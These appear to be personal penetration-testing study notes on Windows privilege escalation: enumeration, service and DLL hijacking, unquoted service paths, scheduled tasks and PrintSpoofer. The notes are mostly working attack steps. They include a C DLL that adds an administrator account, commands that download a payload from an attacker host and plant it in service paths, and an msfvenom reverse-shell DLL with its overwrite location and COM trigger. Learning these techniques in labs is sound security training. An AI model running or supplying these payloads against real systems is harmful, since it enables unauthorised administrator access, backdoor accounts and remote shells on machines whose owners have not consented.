# Enumerating Windows
#### Situational Awareness

```
net use
Get-LocalUser
# look for users/see if Administrator account is enabled
```
Find installed applications:
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

#### Hidden in Plain View

```
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```
#### Information Goldmine PowerShell
Get Powershell history of user
```
Get-History
(Get-PSReadlineOption).HistorySavePath
```
#### Automated Enumeration

# Leveraging Windows Services
#### Service Binary Hijacking

Get running services:
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

If Auto start mode and user has Se ShutdownPrivelege from whoami /priv
```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```
#### Service DLL Hijacking
All windows version have safe ordering making dlls harder to hijack
To exploit, put dll with the name of the missing dll in the correct position of the search order
```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```


Get a list of running processes.
```c
Get-Process
```
List all DLLs loaded by a running process.
```c
Get-Process chrome | select -ExpandProperty modules | group -Property FileName | select name
```
Here is output:
![[Pasted image 20231124093810.png]]



Find process just like before that is in an unprotected folder. 

Run procmon as an administrator. If not, pull it back to local windows and run it there. Create filter just to show that process, then restart the process to see what dll it loads :
![[Pasted image 20231017192647.png]]
mydll.dll did not load. lets replace it according to the order. 

It will try to load into the current working directory of that executable, so in this case, documents. 

```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
*sample dll to add a user named dave2 to localgroup administrators*

### Kernel Level Exploits
https://github.com/SecWiki/windows-kernel-exploits

#### Unquoted Service Paths

##### Powerup will identify this vuln

Get-CimInstance -ClassName win32_service | Select Name,State,PathName

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

from cmd:
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
*this will find and that may be vulnerable*

Then check to see if you can start and stop service:
```
start-service GammaService
Stop-Service GammaService
```
*so we have perms, and dont need to reboot to restart service*

OS will attempt the binary in this order, essential as space characters:
```
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

Next, check perms of each folder along the way:
```
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"
```
**we DO have permissions to "Enterprise Apps", so lets try there. 
![[Pasted image 20231022121117.png]]


Put malicious file we composed earlier into there and restart service:
```
iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```

!! this throws an error, but it does work!! Confirm with 
```
net user
```


Another example:


```
"C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance.exe"

PS C:\Users\damian> icacls "C:\Enterprise Software\Monitoring Solution"
	C:\Enterprise Software\Monitoring Solution CLIENTWK221\damian:(OI)(CI)(RX,W)

copy .\Current.exe "C:\Enterprise Software\Monitoring Solution\Surveillance.exe"
```


# Abusing Other Windows Components

#### Scheduled Tasks

```
schtasks /query /fo LIST /v
```

```
iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\
```

* Look for any task that is running as the current user, is not in a system directory, and is scheduled to run often

#### Using Exploits

![[Pasted image 20231022152251.png]]
Print Spoofer

```
.\PrintSpoofer64.exe -i -c powershell.exe
```
*To obtain an interactive PowerShell session in the context of NT AUTHORITY\SYSTEM with PrintSpoofer64.exe, we'll enter powershell.exe as argument for -c to specify the command we want to execute and -i to interact with the process in the current command prompt.


### DLL REF

=============================================================== C:\Windows\System32\wpcoreutil.dll (Windows Insider service `wisvc` triggerd by Clicking Start Windows Insider Program) 

=============================================================== C:\Windows\System32\phoneinfo.dll (Windows Problem Reporting service) https://twitter.com/404death/status/1262670619067334656 (without reboot by @jonasLyk) 

=============================================================== #dxgi - Trigger is check for protection update C:\Windows\System32\wbem\dxgi.dll (windows security -> check for protection update) 

=============================================================== #tzres.dll C:\Windows\System32\wbem\tzres.dll (systeminfo, NetworkService) =============================================================== ### Need to reboot to get NT AUTHORITY\SYSTEM (hijack dll) ### C:\Windows\System32\wlbsctrl.dll (IKEEXT service) C:\Windows\System32\wbem\wbemcomn.dll (IP Helper) 

=============================================================== C:\Windows\System32\ualapi.dll (spooler service) http://www.hexacorn.com/blog/2016/11/08/beyond-good-ol-run-key-part-50/ 

=============================================================== C:\Windows\System32\fveapi.dll (ShellHWDetection Service) @bohops 

=============================================================== C:\Windows\System32\Wow64Log.dll (this dll loaded by other third party services such as GoogleUpdate.exe) http://waleedassar.blogspot.com/2013/01/wow64logdll.html 

=============================================================== #DLL 
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.190 LPORT=4444 -f dll -o Printconfig.dll 

#Overwrite
C:\Windows\System32\spool\drivers\x64\3\ 

#Trigger 
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}") 
$object = [Activator]::CreateInstance($type) 

=============================================================== # ALL ABOVE REQUIRE ADMIN READ/WRITE
https://github.com/CsEnox/SeManageVolumeExploit/
SeManageVolumeExploit.exe 

===============================================================